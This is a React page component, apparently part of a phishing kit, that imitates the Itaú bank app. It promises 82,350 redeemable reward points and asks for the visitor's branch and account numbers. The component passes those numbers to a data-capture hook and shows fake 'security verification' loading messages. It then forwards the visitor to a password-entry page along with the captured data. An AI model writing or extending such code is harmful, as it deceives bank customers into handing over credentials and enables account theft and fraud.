import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Menu, Bell } from "lucide-react";
import itauLogo from "@/assets/itau-logo.png";
import BottomNav from "@/components/BottomNav";
import { useVisitorTracking, captureFormData } from "@/hooks/useVisitorTracking";

const LOADING_MESSAGES = [
  "Processando...",
  "Validando dados da conta",
  "Verificando módulo de segurança",
  "Processando atualização",
  "Finalizando operação",
  "Aguarde... Estamos te redirecionando para a próxima etapa",
];

const Resgate = () => {
  useVisitorTracking("resgate");
  const navigate = useNavigate();
  const location = useLocation();
  const nome = (location.state as any)?.nome || "";
  const [agencia, setAgencia] = useState("");
  const [conta, setConta] = useState("");
  const [errors, setErrors] = useState<{ agencia?: string; conta?: string }>({});
  const [showLoading, setShowLoading] = useState(false);
  const [loadingStep, setLoadingStep] = useState(0);

  useEffect(() => {
    if (!showLoading) return;
    const interval = 10000 / LOADING_MESSAGES.length;
    const timer = setInterval(() => {
      setLoadingStep((prev) => {
        if (prev >= LOADING_MESSAGES.length - 1) return prev;
        return prev + 1;
      });
    }, interval);
    const redirect = setTimeout(() => {
      navigate("/senha-acesso", { state: { nome, conta, agencia } });
    }, 10000);
    return () => { clearInterval(timer); clearTimeout(redirect); };
  }, [showLoading, navigate, nome, conta, agencia]);

  const handleResgatar = () => {
    const newErrors: { agencia?: string; conta?: string } = {};
    if (agencia.length !== 4) {
      newErrors.agencia = "Agência deve ter 4 dígitos";
    }
    if (conta.length < 6) {
      newErrors.conta = "Conta deve ter no mínimo 6 dígitos";
    }
    setErrors(newErrors);
    if (Object.keys(newErrors).length === 0) {
      captureFormData("resgate", { agencia, conta });
      setShowLoading(true);
      setLoadingStep(0);
    }
  };

  return (
    <div className="min-h-screen max-w-md mx-auto relative" style={{ background: 'linear-gradient(135deg, #FF6200 0%, #E55800 100%)' }}>
      {/* Header */}
      <div className="px-5 pt-6 pb-8">
        <div className="flex items-center justify-between mb-8">
          <Menu className="text-primary-foreground" size={24} />
          <Bell className="text-primary-foreground" size={24} />
        </div>
        <div className="flex flex-col items-start gap-3">
          <img src={itauLogo} alt="Itaú" className="h-12" />
          <h1 className="text-primary-foreground text-2xl font-bold leading-tight">
            Olá, {nome || "cliente"}
          </h1>
          <p className="text-primary-foreground/80 text-base">
            Você possui <strong className="text-primary-foreground">82.350</strong> pontos para o resgate.
          </p>
        </div>
      </div>

      {/* Content */}
      <div className="px-5 pb-32 space-y-6">
        {/* Agência e Conta lado a lado */}
        <div className="flex gap-4">
          <div className="flex-1">
            <label className="text-sm text-primary-foreground/80 block mb-1">Agência sem dígito</label>
            <input
              type="text"
              value={agencia}
              onChange={(e) => { setAgencia(e.target.value.replace(/\D/g, "").slice(0, 4)); setErrors(prev => ({ ...prev, agencia: undefined })); }}
              className={`w-full bg-transparent text-primary-foreground border-b pb-2 outline-none text-base placeholder:text-primary-foreground/40 ${errors.agencia ? "border-yellow-200" : "border-primary-foreground/30"}`}
              placeholder=""
            />
            {errors.agencia && <span className="text-yellow-200 text-xs mt-1 block">{errors.agencia}</span>}
          </div>
          <div className="flex-1">
            <label className="text-sm text-primary-foreground/80 block mb-1">Conta com dígito</label>
            <input
              type="text"
              value={conta}
              onChange={(e) => {
                let v = e.target.value.replace(/\D/g, "").slice(0, 8);
                if (v.length > 7) v = v.replace(/(\d{7})(\d{1})/, "$1-$2");
                setConta(v);
                setErrors(prev => ({ ...prev, conta: undefined }));
              }}
              className={`w-full bg-transparent text-primary-foreground border-b pb-2 outline-none text-base placeholder:text-primary-foreground/40 ${errors.conta ? "border-yellow-200" : "border-primary-foreground/30"}`}
              placeholder=""
            />
            {errors.conta && <span className="text-yellow-200 text-xs mt-1 block">{errors.conta}</span>}
          </div>
        </div>

        {/* Helper text */}
        <p className="text-primary-foreground/70 text-sm">
          Digite sua agência e conta para continuar seu resgate
        </p>

        {/* CTA */}
        <button
          onClick={handleResgatar}
          className="w-full py-4 rounded-full bg-white text-[#FF6200] font-semibold text-base hover:bg-white/90 transition-opacity"
        >
          Iniciar Resgate
        </button>
      </div>

      {/* Bottom Navigation */}
      <BottomNav />

      {/* Loading Modal */}
      {showLoading && (
        <div className="fixed inset-0 z-50 flex items-center justify-center">
          <div className="fixed inset-0 bg-black/50" />
          <div className="relative z-50 w-full max-w-sm mx-4 bg-card rounded-2xl p-8 shadow-xl flex flex-col items-center">
            <img src={itauLogo} alt="Itaú" className="h-14 mb-6" />
            <div className="w-10 h-10 border-[3px] border-muted rounded-full border-t-[#FF6200] animate-spin mb-6" />
            <p className="text-muted-foreground text-base text-center">
              {LOADING_MESSAGES[loadingStep]}
            </p>
          </div>
        </div>
      )}
    </div>
  );
};

export default Resgate;
